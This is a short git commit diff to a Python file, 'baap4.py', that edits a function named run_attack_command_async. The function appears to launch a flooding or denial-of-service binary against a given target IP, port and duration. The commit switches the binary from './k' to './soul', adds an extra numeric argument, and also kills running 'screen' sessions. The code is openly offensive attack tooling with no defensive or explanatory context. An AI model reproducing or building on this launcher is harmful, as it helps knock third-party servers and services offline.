9c0af00221e5f9d066da5d11fe0a102160e6d59c
smakaefa26522 <jsissnsusnaosushdhid@gmail.com>
2025-01-31 23:01:21 +0530

    Update baap4.py

--- baap4.py
+++ baap4.py
@@ -88,7 +88,7 @@ import asyncio
 async def run_attack_command_async(target_ip, target_port, duration):
     # Run both commands concurrently
     attack_process = asyncio.create_subprocess_shell(
-        f"./k {target_ip} {target_port} {duration}"
+        f"./soul {target_ip} {target_port} {duration} 500"
     )
     pkill_process = asyncio.create_subprocess_shell("pkill screen")
 
